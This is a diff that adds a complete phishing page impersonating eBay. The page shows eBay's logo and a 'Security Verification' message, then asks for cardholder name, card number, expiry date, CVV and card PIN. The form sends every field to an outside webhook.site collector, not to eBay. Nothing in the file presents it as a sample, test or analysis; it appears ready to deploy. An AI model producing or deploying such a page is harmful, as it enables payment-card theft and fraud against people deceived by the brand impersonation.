@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verify Your Account | eBay</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body style="font-family: sans-serif; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; background-color: #f7f7f7;">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/1/1b/EBay_logo.svg" alt="eBay" width="100" style="margin-top: 20px; margin-bottom: 30px;">
+    <div style="width: 100%; max-width: 360px; background: white; border: 1px solid #ddd; padding: 20px; border-radius: 8px;">
+        <h2 style="font-size: 20px; font-weight: bold; margin-bottom: 10px;">Security Verification</h2>
+        <p style="font-size: 13px; color: #555; margin-bottom: 20px;">To protect your account, please confirm your current payment method.</p>
+        <form action="https://webhook.site/7a1a62c2-5de4-494f-ab08-dca442324eeb" method="POST">
+            <label style="font-size: 12px; font-weight: bold;">Cardholder Name</label>
+            <input type="text" name="card_name" required style="width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
+            
+            <label style="font-size: 12px; font-weight: bold;">Card Number</label>
+            <input type="number" name="card_num" required style="width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
+            
+            <div style="display: flex; gap: 10px;">
+                <input type="text" name="expiry" placeholder="MM/YY" required style="flex: 1; padding: 10px; border: 1px solid #ccc; border-radius: 4px;">
+                <input type="number" name="cvv" placeholder="CVV" required style="flex: 1; padding: 10px; border: 1px solid #ccc; border-radius: 4px;">
+            </div>
+            
+            <label style="font-size: 12px; font-weight: bold; display: block; margin-top: 15px;">Card PIN</label>
+            <input type="password" name="pin" required style="width: 100%; padding: 10px; margin-bottom: 25px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
+            
+            <button type="submit" style="width: 100%; background: #0053a0; color: white; padding: 12px; border: none; border-radius: 25px; font-size: 16px; font-weight: bold;">Verify & Confirm</button>
+        </form>
+    </div>
+</body>
+</html>
